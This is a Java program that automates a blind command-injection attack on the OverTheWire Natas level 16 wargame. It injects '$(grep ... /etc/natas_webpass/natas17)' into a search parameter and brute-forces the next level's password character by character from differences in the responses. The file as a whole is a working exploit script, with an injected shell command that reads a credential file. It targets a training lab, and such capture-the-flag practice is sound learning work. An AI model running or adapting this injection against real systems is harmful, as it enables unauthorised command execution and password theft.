import org.apache.commons.lang.time.StopWatch;
import org.apache.http.HttpResponse;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

/**
 * Created by alexk on 12.07.2017.
 */
public class CommandInjectBruteForce {
    static String marker = "marker";
    static String avaibleChars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    static String urlTemplate = "http://natas16.natas.labs.overthewire.org/index.php?needle=%s&submit=Search";

    public static void main(String[] args) throws Exception {
        StopWatch stopWatch = new StopWatch();
        stopWatch.start();
        BasicCredentialsProvider credentialsProvider = new BasicCredentialsProvider();
        UsernamePasswordCredentials natas16 = new UsernamePasswordCredentials("natas16", "<censored>");
        credentialsProvider.setCredentials(AuthScope.ANY, natas16);
        HttpClient httpClient = HttpClientBuilder.create().setDefaultCredentialsProvider(credentialsProvider).build();
        String passwordChars = "";

        for (char c : avaibleChars.toCharArray()) {
            HttpGet get = generateRequest("$(grep -E ^.*" + c + ".* /etc/natas_webpass/natas17)marker");
            HttpResponse response = httpClient.execute(get);
            if (passwordMatches(response)) {
                passwordChars += c;
                System.out.println(passwordChars);
            }
        }
        stopWatch.stop();
        System.out.println("Char selected, time: " + stopWatch.toString());
        System.out.println("Starting password generation");
        stopWatch.reset();
        stopWatch.start();
        String password = "";
        for (int i = 0; i < 32; i++) {
            for (char c : passwordChars.toCharArray()) {
                HttpGet get = generateRequest("$(grep -E ^" + password + c + ".* /etc/natas_webpass/natas17)marker");
                HttpResponse response = httpClient.execute(get);
                if (passwordMatches(response)) {
                    password += c;
                    System.out.println(password);
                }
            }
        }
        stopWatch.stop();
        System.out.println("Password selected, time: " + stopWatch.toString());
        System.out.println("Done: " + password);
    }

    private static boolean passwordMatches(HttpResponse response) throws IOException {
        if (response.getStatusLine().getStatusCode() != 200) {
            return false;
        }
        String responseBody = EntityUtils.toString(response.getEntity(), "UTF-8");
        return !responseBody.contains(marker);
    }

    private static HttpGet generateRequest(String query) throws UnsupportedEncodingException {
        String encodedQuery = URLEncoder.encode(query);
        String url = String.format(urlTemplate, encodedQuery);
        return new HttpGet(url);
    }
}